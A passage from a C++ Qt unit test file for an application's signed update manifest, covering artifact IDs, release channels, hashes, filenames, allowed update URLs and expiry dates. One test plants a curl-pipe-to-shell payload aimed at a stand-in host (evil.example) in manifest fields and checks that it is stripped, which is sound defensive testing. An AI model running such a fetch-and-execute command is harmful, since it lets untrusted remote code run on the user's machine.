    manifest.insert(QStringLiteral("future_field"), QStringLiteral("whatever"));
    manifest.insert(QStringLiteral("nested"), QJsonObject{ { QStringLiteral("a"), 1 } });

    QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
    artifacts.insert(QStringLiteral("linux-fooix"), artifactObject(QStringLiteral("x.fooix")));
    artifacts.insert(QStringLiteral("linux-flatpak"), artifactObject(QStringLiteral("x.flatpak")));
    manifest.insert(QStringLiteral("artifacts"), artifacts);

    const UpdateManifest::Result result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));
    QCOMPARE(result.manifest.artifactIds(), QStringList{ QStringLiteral("linux-deb") });
    QVERIFY(!result.manifest.artifactForId(QStringLiteral("linux-fooix")).has_value());
    QVERIFY(!result.manifest.artifactFor(InstallType::LinuxFlatpak).has_value());
}

void UpdateManifestTest::manifestCanNeverCarryACommand()
{
    const QString payload = QStringLiteral("/bin/sh -c 'curl evil.example | sh'");
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("install_command"), payload);
    manifest.insert(QStringLiteral("command"), payload);
    manifest.insert(QStringLiteral("exec"), QJsonArray{ QStringLiteral("/bin/sh"),
                                                        QStringLiteral("-c"), payload });
    QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
    QJsonObject artifact = artifacts.value(QStringLiteral("linux-deb")).toObject();
    artifact.insert(QStringLiteral("install_command"), payload);
    if (!mirrorHost().isEmpty()) {
        artifact.insert(QStringLiteral("mirror_url"),
                        mirrorArtifactUrl(QStringLiteral("lightning_0.8.0_amd64.deb")));
    }
    artifacts.insert(QStringLiteral("linux-deb"), artifact);
    manifest.insert(QStringLiteral("artifacts"), artifacts);

    const UpdateManifest::Result result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));

    const UpdateManifest &parsed = result.manifest;
    const QStringList exposedStrings{
        parsed.versionString(),   parsed.channel(),
        parsed.tag(),             parsed.releaseNotes(),
        parsed.releaseNotesUrl().toString(), parsed.signingKeyId(),
        parsed.artifactFor(InstallType::LinuxDeb)->filename,
        parsed.artifactFor(InstallType::LinuxDeb)->sha256,
        parsed.artifactFor(InstallType::LinuxDeb)->url.toString(),
        parsed.artifactFor(InstallType::LinuxDeb)->mirrorUrl.toString(),
    };
    for (const QString &value : exposedStrings) {
        QVERIFY2(!value.contains(payload), qPrintable(value));
        QVERIFY2(!value.contains(QStringLiteral("curl")), qPrintable(value));
        QVERIFY2(!value.contains(QStringLiteral("/bin/sh")), qPrintable(value));
    }
    QCOMPARE(parsed.artifactFor(InstallType::LinuxDeb)->filename,
             QStringLiteral("lightning_0.8.0_amd64.deb"));
}

void UpdateManifestTest::modelsEcosystemChannels()
{
    QJsonObject channels;
    channels.insert(QStringLiteral("linux-flatpak"),
                    QJsonObject{ { QStringLiteral("available"), false },
                                 { QStringLiteral("version"), QJsonValue(QJsonValue::Null) },
                                 { QStringLiteral("note"),
                                   QStringLiteral("pending Flathub publication") } });
    channels.insert(QStringLiteral("linux-snap"),
                    QJsonObject{ { QStringLiteral("available"), true },
                                 { QStringLiteral("version"), QStringLiteral("0.8.0") } });
    channels.insert(QStringLiteral("linux-deb-repo"),
                    QJsonObject{ { QStringLiteral("available"), true },
                                 { QStringLiteral("version"), QStringLiteral("0.7.0") } });
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("channels"), channels);

    const UpdateManifest::Result result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));

    const Version installed = *Version::parse(QStringLiteral("0.7.0"));
    QVERIFY(result.manifest.channelOffersUpdate(QStringLiteral("linux-snap"), installed));
    QVERIFY(!result.manifest.channelOffersUpdate(QStringLiteral("linux-flatpak"), installed));
    QVERIFY(!result.manifest.channelOffersUpdate(QStringLiteral("linux-deb-repo"), installed));
    QVERIFY(!result.manifest.channelOffersUpdate(QStringLiteral("linux-rpm-repo"), installed));

    const std::optional<ManifestChannel> flatpak =
        result.manifest.channelFor(QStringLiteral("linux-flatpak"));
    QVERIFY(flatpak.has_value());
    QVERIFY(!flatpak->available);
    QVERIFY(!flatpak->version.has_value());
    QCOMPARE(flatpak->note, QStringLiteral("pending Flathub publication"));

    channels.insert(QStringLiteral("linux-snap"),
                    QJsonObject{ { QStringLiteral("available"), true },
                                 { QStringLiteral("version"), QStringLiteral("latest") } });
    manifest.insert(QStringLiteral("channels"), channels);
    QCOMPARE(verify(manifest).error, ManifestError::ChannelMalformed);
}

void UpdateManifestTest::aRepositoryRpmReadsItsChannelAndNeverAnArtifact()
{
    QCOMPARE(UpdateManifest::channelIdForInstallType(InstallType::LinuxRpmRepo),
             QStringLiteral("linux-rpm-repo"));
    QCOMPARE(UpdateManifest::channelIdForInstallType(InstallType::LinuxFlatpak),
             QStringLiteral("linux-flatpak"));
    QCOMPARE(UpdateManifest::channelIdForInstallType(InstallType::LinuxSnap),
             QStringLiteral("linux-snap"));

    QJsonObject manifest = baseManifest();
    QJsonObject artifacts = manifest.value(QStringLiteral("artifacts")).toObject();
    const QJsonObject rpm = artifactObject(QStringLiteral("lightning-0.8.0-1.x86_64.rpm"));
    artifacts.insert(QStringLiteral("linux-rpm-repo"), rpm);
    artifacts.insert(QStringLiteral("linux-rpm"), rpm);
    manifest.insert(QStringLiteral("artifacts"), artifacts);
    const UpdateManifest::Result result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));
    QVERIFY(!result.manifest.artifactFor(InstallType::LinuxRpmRepo).has_value());
    QVERIFY(result.manifest.artifactFor(InstallType::LinuxRpm).has_value());
}

void UpdateManifestTest::validatesHashAndFilenameHelpers()
{
    QVERIFY(isValidSha256Hex(kValidHash));
    QVERIFY(!isValidSha256Hex(kValidHash.toUpper()));
    QVERIFY(!isValidSha256Hex(kValidHash.left(63)));
    QVERIFY(!isValidSha256Hex(QString()));

    QVERIFY(isSafeArtifactFilename(QStringLiteral("lightning_0.8.0_amd64.deb")));
    QVERIFY(isSafeArtifactFilename(QStringLiteral("Lightning-0.8.0-x86_64.AppImage")));
    QVERIFY(!isSafeArtifactFilename(QStringLiteral("dir/file.deb")));
    QVERIFY(!isSafeArtifactFilename(QStringLiteral("..")));
}

void UpdateManifestTest::validatesUpdateUrls()
{
    const QString host = lightning::update::canonicalUpdateHost();
    for (const auto &allowed : { &isAllowedManifestUrl, &isAllowedArtifactUrl }) {
        QVERIFY((*allowed)(QUrl(QStringLiteral("https://%1/a/b").arg(host))));
        QVERIFY((*allowed)(QUrl(QStringLiteral("https://%1:443/a/b").arg(host))));
        QVERIFY(!(*allowed)(QUrl(QStringLiteral("http://%1/a/b").arg(host))));
        QVERIFY(!(*allowed)(QUrl(QStringLiteral("https://%1:8443/a/b").arg(host))));
        QVERIFY(!(*allowed)(QUrl(QStringLiteral("https://evil.example/a/b"))));
        QVERIFY(!(*allowed)(QUrl(QStringLiteral("ftp://%1/a/b").arg(host))));
        QVERIFY(!(*allowed)(QUrl(QStringLiteral("/relative/path"))));
        QVERIFY(!(*allowed)(QUrl()));
    }

    for (const QUrl &url : { lightning::update::latestManifestUrl(),
                             lightning::update::latestManifestSignatureUrl(),
                             lightning::update::manifestUrlForVersion(QStringLiteral("0.8.0")),
                             lightning::update::manifestSignatureUrlForVersion(
                                 QStringLiteral("0.8.0")) }) {
        QVERIFY(isAllowedManifestUrl(url));
        QCOMPARE(url.host(), host);
        QVERIFY(!url.hasQuery());
        QVERIFY(url.userInfo().isEmpty());
    }
}

void UpdateManifestTest::expiryIsOptionalAndInformational()
{
    QJsonObject manifest = baseManifest();
    manifest.remove(QStringLiteral("expires"));
    UpdateManifest::Result result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));
    QVERIFY(!result.manifest.expires().isValid());
    manifest.insert(QStringLiteral("expires"), QString());
    result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));
    QVERIFY(!result.manifest.expires().isValid());
    QVERIFY(!result.manifest.expiresMalformed());
    const UpdateManifest::Result dated = verify(baseManifest());
    QVERIFY2(dated.ok, qPrintable(dated.message));
    QCOMPARE(dated.manifest.expires(),
             QDateTime::fromString(QStringLiteral("2026-12-14T12:00:00Z"), Qt::ISODate));
}

void UpdateManifestTest::aMalformedExpiryReadsAsNone_data()
{
    QTest::addColumn<QJsonValue>("value");
    QTest::newRow("not a date") << QJsonValue(QStringLiteral("soon"));
    QTest::newRow("number") << QJsonValue(1700000000);
    QTest::newRow("local time") << QJsonValue(QStringLiteral("2026-12-14T12:00:00"));
    QTest::newRow("date only") << QJsonValue(QStringLiteral("2026-12-14"));
}

void UpdateManifestTest::aMalformedExpiryReadsAsNone()
{
    QFETCH(QJsonValue, value);
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("expires"), value);
    const UpdateManifest::Result result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));
    QVERIFY(!result.manifest.expires().isValid());
    QVERIFY(result.manifest.expiresMalformed());
    manifest.remove(QStringLiteral("expires"));
    QVERIFY(!verify(manifest).manifest.expiresMalformed());
}

void UpdateManifestTest::boundsAChannelNote()
{
    QJsonObject channels;
    channels.insert(QStringLiteral("linux-flatpak"),
                    QJsonObject{ { QStringLiteral("available"), false },
                                 { QStringLiteral("note"), QString(5000, QLatin1Char('n')) } });
    QJsonObject manifest = baseManifest();
    manifest.insert(QStringLiteral("channels"), channels);
    const UpdateManifest::Result result = verify(manifest);
    QVERIFY2(result.ok, qPrintable(result.message));
    QCOMPARE(result.manifest.channelFor(QStringLiteral("linux-flatpak"))->note.size(),
             UpdateManifest::kMaxChannelNoteChars);
}

QTEST_APPLESS_MAIN(UpdateManifestTest)
#include "UpdateManifestTest.moc"
